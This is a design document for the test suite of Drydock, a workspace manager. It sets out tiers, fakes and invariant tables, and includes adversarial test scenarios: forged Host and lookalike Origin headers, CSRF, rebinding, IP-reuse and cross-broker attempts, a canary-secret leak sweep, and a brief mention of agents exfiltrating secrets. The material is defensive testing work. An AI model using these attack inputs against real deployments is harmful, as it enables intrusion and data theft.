# Drydock testing

*How a system whose load-bearing properties are mostly things that must **never** happen gets a test suite that actually notices when one of them does.*

**Status** design document, draft v1 · **Date** 2 October 2026

**Supplements** [`../overall/drydock-design.md`](../overall/drydock-design.md) draft v5 · [`../port-forwarding/port-forwarding-design.md`](../port-forwarding/port-forwarding-design.md) draft v3 · reads [`../security-review.md`](../security-review.md) draft v1 and [Spike 00](../spikes/00-shared-credential-volume.md)

**Out of scope** CI vendor specifics beyond topology · packaging and release mechanics · testing Caddy's or Docker's own correctness

## 1. Problem & goals

Drydock is roughly four thousand lines of glue around five things it does not control — the `devcontainer` CLI, the Docker daemon, GitHub's App API, Claude Code's terminal output, and a browser's cookie policy — plus two components that are genuinely load-bearing, the session supervisor and the token broker. A conventional suite aimed at "do the features work" would test the glue and miss the system, because almost nothing in §13.5 of the overall design is a feature. They are prohibitions, and a prohibition is not satisfied by a passing test that never got far enough to violate it.

The sharpest version of the problem: **a test suite that asserts only absences passes perfectly on a binary that does nothing.** `drydock` with its `main()` deleted binds no TCP port, returns no secret value, puts no Docker socket in any container, and leaks nothing into a log. Every negative assertion in §13.5 is satisfied. That is the failure mode this document is organised around.

### What the suite has to do

- **Catch the silent failures.** Every invariant in CLAUDE.md and §13.5 whose violation produces a system that still builds, starts, and appears to work.
- **Prove the prohibitions are not vacuous.** Each negative assertion carries a positive control in the same test, so a broken feature cannot masquerade as a held boundary (§4.1).
- **Be fast enough to run on every commit.** The tiers that need Docker and a browser are a minority; the rest must finish in under a minute or they will be skipped.
- **Pin the brittle contracts.** Two scrapes of Claude Code's TUI, one JSON contract with the `devcontainer` CLI, one line protocol, one `/proc` format. Each gets a recorded fixture corpus *and* a way to re-record it.
- **Close the design's own open questions.** [PF §14.1](../port-forwarding/port-forwarding-design.md) asks three browser-level questions and answers none of them; §10 of the browser tier is how they get answered.
- **Never touch production.** Tests run Docker, create containers, and reconcile by label. A test run that adopts or deletes a real workspace destroys unpushed work (§5.4).

### Non-goals

- **Not a coverage target.** A percentage is satisfied by testing the pure functions, which are the part least likely to be wrong. The invariant map in §8 is the coverage metric; a row without a test is the only coverage gap that matters.
- **Not a performance suite.** §1's non-functional targets (3 min cold, 30 s warm) are measured and recorded by the release smoke test, not gated in CI. Timing assertions on a home dev server under a Docker build are flaky by construction, and a flaky gate is a disabled gate.
- **Not testing the agent.** Whether Claude writes good code, or reads a hostile issue body and exfiltrates a secret, is not a property of Drydock. §10.4 of the overall design already states there is no technical control there; a test cannot invent one.
- **Not testing dependencies' correctness.** Caddy's TLS stack, SQLite's durability, Docker's networking. What *is* tested is Drydock's *configuration* of them, which is a different thing and the place the mistakes live (§3.2, the Caddyfile conformance test).
- **Not a mutation-testing or fuzzing programme.** Two targeted property tests and one fuzz target earn their place (§6.4, §15.1); a general campaign does not, on a codebase this size.
- **Not a staging environment.** There is one dev server. The container tier runs inside the devcontainer's own Docker-in-Docker, which is the isolation that would otherwise cost a second machine.

## 2. Binding constraints

Five facts decide the shape of the suite. They are the testing counterpart of §2 of the overall design: stated first, because three of them rule out the obvious approach.

### 2.1  Absence is the default, so every prohibition needs a witness

Covered above, and it generalises past §13.5. "Nothing stops a workspace automatically" (§1), "never reap `.oauth_refresh.lock`" (Spike 00, consequence B), "no re-auth prompt on destructive routes" (§13.5) — all are *absences of code*. Some can be turned into observations about a running system (§4.1); a few genuinely cannot, and §8.7 lists them honestly as review gates rather than pretending a test covers them.

### 2.2  The interesting seams are all subprocess or container boundaries

The pure-logic surface is small: a state machine, a handful of parsers, AEAD sealing, redaction, slug minting. Everything else is `exec`, a Unix socket, or the Docker daemon. That means the middle tier — in-process HTTP server, real SQLite, real sockets, **faked subprocesses** — is where most of the value is, and that it only exists if the subprocess boundaries are interfaces rather than inline `exec.Command` calls. §5 states those seams as design requirements, because retrofitting them is the expensive version.

### 2.3  Two dependencies have no stable contract at all

> [!WARNING]
> **Load-bearing fragility**
>
> Claude Code's terminal output and a browser's cookie policy are both things Drydock depends on precisely and neither publishes a contract. The login URL, the pasted-code prompt, the `claude.ai/code/<id>` session URLs, the eligibility error on an ineligible account, `/status` output, and the four shapes of `.credentials.json` are all undocumented internals of a pinned version (§11 of the overall design, and Spike 00 consequence F). `SameSite`, `__Host-`, and cross-site `POST` behaviour are browser behaviour the design explicitly notes it "does not control and cannot test in CI" (§13.3).

The answer for the first is a recorded fixture corpus plus a re-record ritual (§7). The answer for the second is a small real-browser tier (§10) — the design's claim that it cannot be tested in CI is true only of a CI without a browser in it, and one Chromium is cheaper than the alternative, which is finding out from an attacker.

### 2.4  The expensive unit is an image build, not a test

A `devcontainer up` against a cold cache is minutes. A container tier that builds per test is a container tier nobody runs. So: fixture repos are tiny and share **one** pre-built base image, built once per CI run and reused; tests that only need a running container reuse a single warm workspace; only the tests that are *about* building (the Feature's assertions, `--additional-features` composition, the hostile-config scenarios) pay for a build, and those run through `devcontainer features test`, which is built for it (§6.5).

### 2.5  What the environment gives for free

| Capability | Mechanism | Note |
|---|---|---|
| A real Docker daemon that is not the host's | docker-in-docker in the devcontainer | Already a deliberate choice for path identity (CLAUDE.md); it doubles as test isolation. Containers a test creates are invisible to the host's `docker ps`. |
| Two genuinely separate registrable domains | `drydock.test` / `drydock-preview.test` | `.test` is reserved and absent from the Public Suffix List, so these are distinct eTLD+1 — which is the whole property PF §10.2 rests on. Without this the browser tier would need two real domains. |
| Official Feature test harness | `devcontainer features test`, `scenarios.json` | Purpose-built for "this feature must fail loudly under that configuration", which is exactly §11's `postCreate` assertions. |
| A precedent for re-runnable evidence | `docs/design/spikes/harness/` | Spike 00 already established the pattern: a result is worth little if it cannot be re-checked against a new version. The fixture corpus in §7 is the same idea applied continuously. |
| Caddy, `sqlite3`, `socat`, `nc`, `jq`, Node | devcontainer toolchain | The Caddyfile conformance test and the browser tier need no new system dependencies. |

## 3. Four tiers

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="diagrams/01-test-reach-dark.svg">
  <img alt="The request path drawn left to right as seven boxes: LAN browser, Caddy, API and preview muxes, managers and broker and SQLite, devcontainer CLI and Docker, workspace container, GitHub and Anthropic. Below it, five bars show how far each tier reaches. The unit bar covers only the muxes and managers. The component bar adds Caddy and stops before the devcontainer CLI, where fakedevcontainer, fakegithub and fakeclaude stand in. The container bar covers the muxes through the workspace container with real Docker, faking only GitHub and Claude. The browser bar covers everything from the LAN browser to the workspace container. The rituals bar covers the entire path with nothing substituted, and is triggered by an event rather than a commit." src="diagrams/01-test-reach-light.svg" width="100%">
</picture>

**Fig 1** — *The tiers are distinguished by where they stop, not by how many assertions they make. Each one ends at a boundary it substitutes for, and the substitute is named — so "which tier should this test live in?" has a mechanical answer: the cheapest tier whose reach includes the boundary the assertion is about. Only the rituals bar is unbroken, and it is the only one a human triggers.*

| Tier | Real | Substituted | Lives in | Budget |
|---|---|---|---|---|
| **unit** | Pure functions. No clock, no filesystem beyond `t.TempDir()`, no socket. | Everything, by not being reached. | `_test.go` beside the code | < 10 s |
| **component** | The real `http.Server` on real Unix sockets, real SQLite file, real Caddy process, real shell shims. | `devcontainer` CLI, Docker, GitHub, Claude Code — all four as fake *binaries on `PATH`* or fake *HTTP servers*, never as mocked Go interfaces where a real process will do. | `test/component/` | < 60 s |
| **container** | Docker-in-Docker, real `devcontainer up`, real containers, real broker socket bind-mounts, real `/proc` scans. | GitHub (incl. the git remote), Claude Code. | `test/container/`, tag `docker` | < 10 min warm |
| **browser** | Chromium, real Caddy with real certs on two registrable domains, the whole request path. | GitHub, Claude Code. | `test/browser/` (Playwright) | < 5 min |

Plus **rituals** (§11), which are not a tier because they are not triggered by a commit.

### 3.1  Choosing a tier

The rule is the cheapest tier that reaches the boundary the assertion is about, and the corollary is that a test which could live in two tiers lives in the cheaper one *and* the expensive one only if the expensive one asserts something different. The reconciliation table (§6 of the overall design) is the model case: five rows as a pure function in unit, and exactly two of those rows again in container — adopt-an-orphan and died-unobserved — because those two are the ones where the interesting part is Docker's behaviour rather than Drydock's branch.

### 3.2  The Caddyfile is a tested artifact

Three of the design's defenses live in a config file: strict `Host` matching (§13.3), `header_up` replacing rather than appending `X-Forwarded-For` (§13.2), and access logging off on the preview vhost (PF §7). "The defense doesn't live in one config file" is the stated principle; the test that the config file half is right belongs in component, because Caddy is a binary in the devcontainer and a recording Unix-socket backend is twenty lines.

| Assertion | How |
|---|---|
| A foreign `Host` matches no site block | `curl --resolve` with `Host: evil.example` → connection refused by Caddy, backend records nothing |
| A bare-IP request matches no site block | same, with the IP as `Host` |
| The UI host reaches `http.sock` and nothing else | backend records the request; the preview socket records nothing |
| A preview host reaches `preview.sock` and nothing else | converse of the above |
| `X-Forwarded-For` is replaced, not appended | client sends a forged XFF; backend sees exactly one value, Caddy's |
| `Host` survives the hop to a Unix socket | backend sees the original preview hostname — PF §9 depends on this as the routing key |
| SSE is not buffered | backend writes a frame and holds the response; client receives it before the body ends |
| The preview vhost writes no access log | after a handshake carrying `?t=<canary>`, no file under Caddy's log dir contains the canary |

## 4. Two rules that do more work than the tiers

### 4.1  Paired assertions: every negative test carries its positive control

**A test that would still pass if the feature under test were deleted is not a test of the invariant.** So every prohibition is asserted in the same test function as a demonstration that the machinery was live when the prohibition held.

| Prohibition | Positive control in the same test |
|---|---|
| No TCP listener | the Unix socket is listening and a signed-in `GET /api/repos` returns `200` |
| No route returns a secret value | the canary secret is retrievable over the broker socket from inside its granted workspace |
| Absent `Origin` is refused | the same `POST` with the correct `Origin` returns `202` |
| The preview cookie never reaches the container | the recording upstream saw the request at all, and the *app's own* cookie passed through untouched |
| Container A cannot reach B's broker socket | A reaches its own socket and gets a token that works against A's repo |
| No Docker socket in a workspace container | the container is otherwise healthy — the `postStart` broker probe passes |
| Nothing is logged | the scenario actually produced events, and a non-secret marker *is* found by the same sweep |

That last row is the general form, and it is worth stating as its own rule: **the sweep must find something.** A grep-based leak test that finds nothing because the log file was never created is indistinguishable from success.

### 4.2  The canary sweep

One test covers "redact by default" across the whole system, and it does so by not knowing where the sinks are.

Every component test runs with its entire mutable state inside one temp root: the SQLite file, the socket directory, Caddy's log and config, the event store, captured `stdout`/`stderr`, a captured SSE transcript, and the supervisor ring-buffer dump. The scenario seeds uniquely-greppable canaries — a password, a session cookie value, a secret value, a login code, a GitHub token in `ghs_` shape, a preview one-time token, the App private key's PEM body, the secrets master key — drives a full lifecycle, and then greps *the whole tree plus the raw bytes of the SQLite file* for every canary.

New sinks are covered automatically because they are files in the tree. That property is the point, and it is why the sweep is worth more than a per-sink assertion list that someone has to remember to extend.

Three details that decide whether it works:

- **Canaries must be high-entropy and structurally valid.** `ghs_` plus 36 random chars, a PEM that parses, a `postgres://` URL. A canary of `CANARY_SECRET` would be rejected by a validator or quoted differently than a real value.
- **The sweep searches for transformations too.** Base64, URL-encoding, and JSON-escaped forms of each canary, because a value that reaches a log *through* an encoder is still leaked. Hex-encoded `sha256(cookie)` is the one expected hit: it is in the DB by design, so the sweep asserts it is present and that the plaintext is not.
- **One non-secret marker proves the sweep ran.** §4.1's general form.

> [!NOTE]
> **The sweep is also the test for "the schema has nothing to steal"**
>
> §4 of the overall design lists four deliberate absences — no plaintext secret value, no plaintext session token, no `github_token` column, no token in `token_grant`. The sweep over the SQLite file's raw bytes tests all four at once, including the case a column-level assertion misses: a value that reached the file through a free-text column such as `event.message` or `workspace.state_detail`.

## 5. Testability seams the code must have

These are design requirements, not test code. Each exists because a tier is impossible without it, and each is far cheaper decided now than retrofitted. They belong in Phase 1 (§13).

### 5.1  The route table is data

`http.ServeMux` cannot be enumerated, so the mux is built from a declarative slice — `{method, pattern, handler, mutating bool}` — and the auth middleware wraps the whole thing as §13.5 requires. The meta-tests then drive the slice rather than a hand-maintained list of paths:

- every entry except `POST /api/auth/session` returns `401` with no cookie;
- the set of entries answering without a cookie is *exactly* that one;
- every `mutating` entry refuses a wrong, lookalike, and absent `Origin`;
- no entry emits `Access-Control-Allow-Origin`;
- every entry, requested on `preview.sock`, returns `404` and never reaches a handler;
- the preview mux's entry set is exactly `{GET /.drydock/session, GET /.drydock/denied}`.

A route added in Phase 6 is covered by all six without anyone editing a test. That is the testing form of "protected by forgetting to think about it."

### 5.2  Time, disk, and randomness are injected

Lockout backoff, the 30-day/14-day session ceilings, the three-day expiry warning, the 60-second preview token TTL, the five-minute login deadline, the supervisor's 2 s→60 s backoff, the discovery debounce and grace period. Every one of these is a timing rule, and a suite that tests them by sleeping is a suite that takes nine minutes and flakes. One `Clock` interface, one `DiskUsage` interface, one seeded `rand.Source` for slug minting — and the real implementations are the default so nothing production-facing changes shape.

### 5.3  Subprocess boundaries resolve by `PATH`

The container manager invokes `devcontainer`; the supervisor invokes `devcontainer exec … claude`. Both resolve the binary by name through a configurable `PATH` (or an injected resolver), so the component tier substitutes a fake binary without an interface mock. This matters more than it looks: a Go interface mock of the CLI tests Drydock's *belief* about the CLI's output, while a fake binary tests Drydock's actual argv construction, pipe handling, exit-code reading, and JSON parsing. The argv is a security surface — `--mount` and `--additional-features` are built from workspace data — and only the fake-binary form lets a test assert on it.

### 5.4  The label namespace is configurable

> [!WARNING]
> **This one prevents a test from destroying real work**
>
> Reconciliation adopts, stops, and resumes containers found by `label=drydock.workspace` (§6). A test Drydock pointed at a daemon that also holds production containers will adopt them — and the delete path will remove them. The advisory lock on the SQLite file (§12) does not help, because a test uses its own database file.
>
> So the label *key* is configuration, not a constant. Tests use `drydock.test.<run-id>.workspace`, every created object carries the run id, and teardown removes by that label. Two further belts: the container tier runs only against the devcontainer's inner DinD daemon, never a daemon that holds production containers; and the test harness refuses to start if it finds any container carrying the production label key.

### 5.5  State classification is a pure function

Three places turn foreign text into a Drydock state, and all three must be callable without the thing that produced the text: the scrape of Claude Code's TUI (→ login URL / code prompt / success / failure / session URL / eligibility error), the credential-file read (→ `ok` / `expiring` / `expired` / `blanked` / `absent`), and the `devcontainer up` result (→ `running` / `failed` + the step that failed). Each is `func(input []byte) (state, error)` over a fixture corpus. This is the single highest-value seam in the system, because it converts the two most brittle dependencies into table-driven unit tests.

## 6. Fakes and fixtures

### 6.1  No fake without a contract test

A fake encodes a belief about a real system, and the belief rots. Every fake therefore ships with (a) the version of the real thing it was recorded against, written in the fake's source, and (b) a contract test that asserts the same expectations against the real thing, in a tier or ritual that reaches it.

| Fake | Stands in for | Contract test | Runs |
|---|---|---|---|
| `fakedevcontainer` | the `devcontainer` CLI | one container test runs the real CLI and asserts the `{outcome, containerId, remoteUser}` JSON shape, the `--id-label` lookup behaviour, and that `--additional-features` composes rather than replaces | container tier, every run |
| `fakegithub` | `api.github.com` **and** the git smart-HTTP remote | a manual test against a real test App on a throwaway repo, asserting the installation-token request/response shape and `repository_ids` + `permissions` enforcement | ritual, on GitHub API change or quarterly |
| `fakeclaude` | the `claude` binary, on a PTY | re-recording the fixture corpus from the pinned version | ritual, on every Claude Code bump (§11.1) |
| `fakeupstream` | a repo's dev server | none needed — it is a recording echo server, not a belief about anything | — |

### 6.2  `fakedevcontainer`

A Go binary that mimics the CLI's contract and is scriptable through a JSON file: succeed, fail at a named step, hang, emit malformed JSON, emit valid JSON with `outcome: error`, return a container id that Docker does not have. That last one is how the "DB says running, Docker says absent" reconciliation row gets tested at component speed.

It is also what makes §6's "every step writes an event" testable as a property rather than a hope: for each of the eight steps, script a failure at that step and assert the resulting event names *that* step. Eight table rows, and the requirement is covered.

### 6.3  `fakegithub`

An `httptest` server plus a git smart-HTTP handler over the same listener, so one fake is both the API and the remote. It asserts on what it receives as much as it serves:

- the JWT is `RS256`, signed by the test App key, with a sane `iat`/`exp` and the App id as `iss`;
- the token request's `repository_ids` is exactly one id, and it is the workspace's;
- the `permissions` object matches the §9.3 table **exactly** for the requested scope — stored as two golden JSON fixtures, one per scope, so widening the broker's request fails a test;
- a second request within the cache window never arrives (the cache-by-permission-set claim in §9.2);
- the git remote records the `Authorization` header, so the credential helper's output is observed rather than inferred.

Serving the fixture repos over real git-HTTPS is what lets the clone path in §6 step 2 be tested for real, including the assertion that matters: after cloning, no token appears anywhere in the working tree or `.git/`.

### 6.4  `fakeclaude`

A binary that replays a recorded transcript onto a PTY and reads stdin. Three properties are load-bearing:

- **It must be a PTY, not a pipe.** Claude Code's output differs between the two, and the whole point is to exercise the PTY path the supervisor really uses.
- **The PTY width is a test parameter.** A login URL line-wrapped at 80 columns is the realistic failure the scraper must survive; narrow and wide are separate cases.
- **It asserts on what it receives.** The login handshake test is only meaningful if `fakeclaude` confirms the pasted code arrived on its stdin, exactly once, with the expected framing.

Scripted modes: successful login; login timeout; login failure; immediate exit with the account-ineligibility signature; serving, then emitting session URLs on a delay; crash-loop; emit a `claude.ai/code/<id>`-shaped URL *as model output rather than as a server announcement* (the false-positive case §7 cares about).

### 6.5  Fixture repos, and the Feature's own suite

Five tiny repos in `test/fixtures/repos/`, served by `fakegithub` and used by the container tier:

| Fixture | Shape | Tests |
|---|---|---|
| `plain` | no `.devcontainer/` at all | §6 step 3's generated `--override-config` path, and that the repo is left untouched |
| `simple` | minimal valid `devcontainer.json` | the happy path, the warm workspace most container tests reuse |
| `hostile` | sets `ANTHROPIC_BASE_URL`, pins a conflicting `remoteUser`, mounts a volume at `CLAUDE_CONFIG_DIR` | §6's sharp edge and §11's `postCreate` assertions — each as a separate scenario |
| `webapp` | binds `0.0.0.0:8080` and `127.0.0.1:9090`, serves an HMR websocket | the discovery scanner's loopback classification, the proxy, websocket upgrade, `Host` handling |
| `slow` | `postCreateCommand` sleeps past the deadline | timeout and cancel paths, and that a wedged build never requires restarting Drydock |

The Feature itself gets the official harness rather than a bespoke one: `devcontainer features test` with a `scenarios.json` per hostile configuration. One scenario per Remote-Control-killing variable, one for the competing `CLAUDE_CONFIG_DIR` mount, one for the conflicting `remoteUser`, one clean baseline. The assertion in each hostile scenario is *that the build fails and names the variable* — a Feature that silently succeeds there is the exact failure §12 calls "everything builds, nothing connects."

### 6.6  The shell shims are tested from Go

`drydock-credential`, the `gh` shim, and `drydock-secrets export` are shell scripts. They are tested by `exec`ing them against a real fake-broker socket from Go tests, not with a shell test framework — one fewer dependency, and the assertions sit beside everything else. The three that matter:

- `drydock-credential get` emits exactly `username` and `password` lines and nothing else; `store` and `erase` are no-ops that exit `0` (a credential helper that errors on `store` makes git print warnings on every push);
- the `gh` shim fetches per invocation and `exec`s the real binary, with the token in the environment of the child and **not** in its own argv;
- `drydock-secrets export` round-trips arbitrary bytes — see §15.2, which is a finding rather than a test.

## 7. The scrape contract

The most brittle thing in the system gets the most mechanical treatment. `test/fixtures/transcripts/claude-<version>/` holds raw recorded PTY output, one file per scenario, each with a header comment naming the version, the date, the command, and the PTY width it was recorded at.

| Fixture | Must yield |
|---|---|
| `login-url-wide`, `login-url-narrow-80col` | the same URL from both — the wrapped case is the one that breaks |
| `login-code-prompt` | the "paste code" state, so the UI knows to accept input |
| `login-success`, `login-failure`, `login-timeout` | three distinct terminal states |
| `session-url-single`, `session-url-many`, `session-url-delayed` | one, several, and one arriving minutes into the stream (the continuous-tail requirement in §8) |
| `session-url-in-model-output` | **no** session row — a `claude.ai/code/<id>` URL the model printed is not a server announcement |
| `remote-control-ineligible` | `awaiting_login`, with zero restart attempts |
| `connection-lost` | `degraded` |
| `status-ok`, `status-expiring`, `status-expired` | three states plus a parsed `expires_at` |
| `credentials-{ok,expiring,expired,blanked,absent,corrupt}.json` | six states; `blanked` must never classify as `expired` (Spike 00, consequence A) |
| ANSI-heavy variants of the two URL cases | identical results after escape stripping |

Two things this does **not** prove, stated plainly because the gap is where the bug will be: the corpus proves the parser handles the recorded output, not that the recorded output is still what Claude Code emits. Only a live run does that, which is why re-recording is a ritual (§11.1) rather than a test. And a regex that is too permissive passes every positive fixture; the negative fixtures (`session-url-in-model-output`, and a corpus of ordinary agent chatter that must match nothing) are the half that catches it.

## 8. Invariant → test map

The table CLAUDE.md's invariant list and §13.5 / PF §10.7 imply. Columns: the tier it lives in, the mechanism, and the positive control that keeps it from being vacuous (§4.1). Where the control is "the sweep found its marker" it is written as *sweep*.

### 8.1  Front door and session auth

| Invariant | Tier | Test | Control |
|---|---|---|---|
| No TCP listener, ever | component | enumerate the process's own listening sockets after startup; assert empty | signed-in `GET /api/repos` → `200` over the Unix socket |
| Socket is group-owned, mode `0660` | component | `stat` the socket | a request through it succeeds |
| Every route needs a cookie | component | drive the route table (§5.1), no cookie → `401` | each route with a cookie → not `401`; table asserted non-empty |
| Only the sign-in POST is unauthenticated | component | the set answering without a cookie equals that one entry | sign-in with the right password → `204` + cookie |
| `Origin` is exact-match | component | per mutating route: wrong, suffix-lookalike `https://evil.drydock.test`, and absent `Origin` → `403` | correct `Origin` → `202` |
| No permissive or reflected CORS | component | no response from any route carries `Access-Control-Allow-Origin` | at least one route was hit *with* an `Origin` header |
| `Host` is validated in Drydock too | component | foreign `Host` on the API socket, bypassing Caddy → `403` | correct `Host` → `200` |
| Caddy refuses a foreign `Host` first | component | §3.2 | backend records the legitimate request |
| Cookie attributes | unit + browser | exact `Set-Cookie` string; browser accepts `__Host-` and rejects a variant with `Path` altered | browser replays it on a same-site fetch |
| Lockout and the global cap | unit | table over the backoff curve with an injected clock | a correct password after the window succeeds |
| 30-day absolute, 14-day idle, sliding | unit | boundary table, injected clock | a session inside both windows authenticates |
| `argon2id` cost is not silently lowered | unit | the encoded params in a fresh hash meet the configured floor | verification of a known hash succeeds |
| No HTTP route sets the password | component | the route table contains no password-write entry; plausible paths → `404` | `drydock passwd` does change the stored hash |
| Two Drydocks refuse to coexist | component | second start against the same DB file exits non-zero | the first is still serving |
| Password, cookie, login code never persisted | component | *sweep* | *sweep* found its marker |

### 8.2  Secrets

| Invariant | Tier | Test | Control |
|---|---|---|---|
| No route returns a secret value | component | route sweep with a granted canary: no body, SSE frame, or error text contains it | the canary *is* retrievable over the broker (container tier counterpart) |
| The schema has no `value` column | unit | golden `sqlite_schema` snapshot diff | snapshot non-empty and covers every table |
| Default deny | component | ungranted repo's workspace → `GET-SECRETS` count 0 | granted repo's workspace receives it |
| `reach` is required | component | `PUT` without `reach` → `400` | with it → `200` |
| Reserved names refused | unit | table over the full §10.1 list | a legal name is accepted |
| AAD is the secret id | unit | swap two rows' ciphertext+nonce; both decrypts fail | unswapped rows decrypt |
| Master key and App key never in any environment | component | the process's own `environ`, every child's `environ`, and the container's `containerEnv` contain neither; a key file not mode `0400` fails startup | both keys are in use — a secret round-trips and a token is minted |
| Values stay out of `argv`, `ps`, `docker inspect` | container | after supervisor start, none contain the canary | the session process's own `environ` does |
| `secret_access` is written per fetch | component | one row per `GET-SECRETS` | the fetch returned the secret |
| Rotation marks staleness, never restarts | component | rotate; assert workspace flagged and the supervisor pid unchanged | the flag says which kind of stale |

### 8.3  GitHub credentials

| Invariant | Tier | Test | Control |
|---|---|---|---|
| The socket is the identity | container | from container A, connecting to B's socket path fails (it is not mounted) | A's own socket yields a token scoped to A |
| The protocol carries no repo parameter | unit | the parser rejects any extra field on the line | valid lines parse |
| Permission sets are exactly §9.3 | component | golden JSON per scope, asserted by `fakegithub` | the mint succeeded and the token works |
| No token in `.git/config` or the tree | container | after clone, grep the whole workspace for the token canary | the clone succeeded and `git fetch` works through the helper |
| Cache is keyed by permission set | component | 20 `gh` invocations → 1 upstream mint; a different scope → a second | both invocations succeeded |
| `token_grant` holds no token | unit | schema snapshot + *sweep* over the DB bytes | grant rows exist |
| No Docker socket in any workspace container | container | `/var/run/docker.sock` absent; `docker` non-functional | the `postStart` broker probe passes |
| Commits carry the bot identity, branches the `drydock/` prefix | container | the Feature sets `user.email` and the push namespace; a real push to `fakegithub` lands under `drydock/` | the push succeeded |
| Never fall back to a broader credential | component | `fakegithub` returns 403/suspended; assert the error surfaces and no second, wider request is made | the pre-failure request was narrow and worked |

### 8.4  Claude Code

| Invariant | Tier | Test | Control |
|---|---|---|---|
| The five variables stay unset | container (Feature scenarios) | one scenario per variable: build fails naming it | the clean scenario passes `postCreate` |
| Version is pinned, autoupdater off | container + unit | `claude --version` equals the pin; `DISABLE_AUTOUPDATER=1` present; the version string in CLAUDE.md, the Feature, and Spike 00 all agree | the pinned binary runs |
| A blanked credential is not an expired one | unit | the six credential fixtures classify distinctly | *expiring* still produces a countdown |
| `.oauth_refresh.lock` is never reaped | container | plant the lock dir, run a full lifecycle, assert inode and mtime unchanged | the lifecycle completed |
| The credential volume is a local driver | component | startup refuses a non-`local` driver | accepts `local` |
| Fast exit on ineligibility is not a crash | component | the ineligible transcript → `awaiting_login`, zero retries | an ordinary crash transcript → backoff, capped at 6 in 10 min |
| Sessions are observed continuously | component | a URL emitted minutes in still upserts; a model-printed URL does not | a server-announced URL does |
| The PTY buffer is never persisted verbatim | component | *sweep* for the login-code canary after a scripted handshake | `fakeclaude` confirms the code arrived on stdin |
| Login has a deadline and a cancel | component | injected clock past 5 min → handshake killed, Drydock still serving | a cancel mid-handshake frees the PTY and a new login starts |

### 8.5  Previews

| Invariant | Tier | Test | Control |
|---|---|---|---|
| The preview mux serves no API route | component | every API pattern on `preview.sock` → `404`, no handler reached; route set equals the two `/.drydock/*` | an enabled preview proxies on that same socket |
| The upstream is derived, never supplied | unit + component | fuzz `Host`, headers, query, and body for anything that changes the dial target | a legitimate dial reaches `fakeupstream` |
| Re-resolve by label at every dial | container | kill X's container, start another that takes the IP, assert the dial denies rather than reaching Y | before the kill, the dial reached X |
| Re-resolve the PID at every scan | container | kill the container, assert the scan reports empty rather than host listeners | a live container's listeners are found |
| The preview cookie never reaches the container | container | recording upstream asserts absence; an upstream `Set-Cookie` claiming the name is dropped | the app's own cookie passes both ways |
| Previews are default-deny | component | disabled port → `/.drydock/denied`; enabled → proxies | the enable is what flips it |
| Discovery never enables | component | no scan ever changes `enabled` | a scan does change `observed` and `bind_addr` |
| Loopback is diagnosed, never dialed | container | `webapp`'s `127.0.0.1:9090` is listed, greyed, not previewable, and no dial is attempted | its `0.0.0.0:8080` previews fine |
| Discovery fails visibly | component | an unreadable `/proc` path badges "discovery unavailable" and keeps declared ports | the readable case lists observed ports |
| The one-time token is single-use and atomic | component | 100 concurrent consumes → exactly one success | that one completes the handshake |
| The token never lands in a log | component | *sweep* including Caddy's log dir; `Referrer-Policy: no-referrer` on `/.drydock/session` | the handshake succeeded |
| `preview_session` dies with its port and its session | component | disable the port → rows gone; revoke-all → rows gone | the rows existed and worked beforehand |
| A retired slug is never reissued | component | property test over slug minting against the retired set | see §15.4 |
| The preview mux is resource-bounded | component | past the cap → `503`; an idle upgrade is closed | under the cap, upgrades stay open |
| Sign-in appears only on the bare UI origin | component | no preview-mux response contains a password input | the UI's sign-in page does |

### 8.6  Lifecycle, reconciliation, and recovery

| Invariant | Tier | Test | Control |
|---|---|---|---|
| Every step writes an event naming itself | component | eight scripted failures, one per step | the success path emits all eight in order |
| The five reconciliation rows | unit + container | pure table; then adopt-orphan and died-unobserved for real | the adopted workspace is still usable (`exec` + broker probe) |
| **The amnesia test** | container | delete the SQLite file entirely, restart, assert every running workspace is rebuilt from labels | the rebuilt workspace serves a preview and mints a token |
| Nothing auto-starts | container | stop a workspace, restart Drydock, assert still stopped | a `running` one is adopted running |
| Kill -9 mid-operation resumes or fails cleanly | container | SIGKILL during clone, during `up`, and during delete; restart | `deleting` resumes to completion; the others reach `failed` with the step named, never a half state |
| Delete removes worktrees | container | add a worktree the DB does not know about, then delete | `git worktree list` was the source — the unknown worktree is gone too |
| Delete requires the repo name | component | no `?confirm=` → `400`; wrong name → `400` | correct name → `202` |
| The cap refuses and names a candidate | component | at the cap, the refusal body lists running workspaces with session counts | under the cap, create succeeds |
| Disk pre-flight refuses | component | injected reporter over threshold → refusal before any clone | under threshold → proceeds |
| Clone survives rebuild and stop | container | write an uncommitted file, `rebuild`, then `stop`/`start`; assert it survives both | the container id changed on rebuild |

### 8.7  Invariants the suite cannot cover

Stated rather than quietly dropped. Each is a review gate, a ritual, or an upstream fact.

| Invariant | Why not testable | Covered by |
|---|---|---|
| Nothing stops a workspace automatically | the absence of code; a grep for timers is theatre | review gate on any PR touching lifecycle |
| No re-auth prompt on destructive routes | absence again | review gate |
| Remote Control genuinely needs a full login, not a setup token | an upstream fact about Anthropic's service | §2.1 is documentation; the reserved-name test covers our half |
| The shared credential volume stays safe on a future Claude Code version | undocumented internals | re-run Spike 00 (§11.1) |
| `reach` is filled in honestly | a human judgement about prose | the required field is the control; nothing more is available |
| The operator does not type the password into a preview | human behaviour | PF §10.5's UX measures; the browser tier proves the origin is visibly different |
| A granted secret stays inside the container | §10.4 says plainly there is no technical control | nothing. This is the design's stated residual risk, not a test gap |

## 9. Adversarial scenarios

The security review's threat actors become named scenarios rather than being left implicit in §8's rows. Each is one test that plays the actor's whole move, and each maps to a review finding so a regression is traceable to the analysis that found it.

| Scenario | Actor | Plays | Asserts | Review |
|---|---|---|---|---|
| `rebind` | internet page | a request to the API socket with an attacker `Host` | refused at Caddy *and* at Drydock, independently | §13.3 |
| `csrf-plain` | internet page | cross-site `POST /api/workspaces` | no cookie attached; `403` on `Origin`; nothing created | F2 |
| `csrf-suffix` | hostile preview | `POST` with `Origin: https://evil.drydock.test` | `403` — the exact-match requirement, which a suffix check would pass | F2 |
| `csrf-no-origin` | scripted client | `POST` with `Origin` stripped | `403`, fail-closed | F2 |
| `cors-read` | hostile preview | cross-origin `fetch` of a data `GET` | unreadable; no reflected `Origin` | F2 |
| `ip-reuse` | compromised container | X dies unobserved, Y takes its IP, a preview for X is opened | denied, never Y's dev server | F3 |
| `pid-reuse` | — | the container dies, a host process takes its PID, a scan runs | empty scan, never host listeners surfaced | F3 |
| `cross-broker` | compromised container | A tries B's socket path, and a `GET-TOKEN` with an injected repo field | ENOENT; the extra field is a parse error | §9.1 |
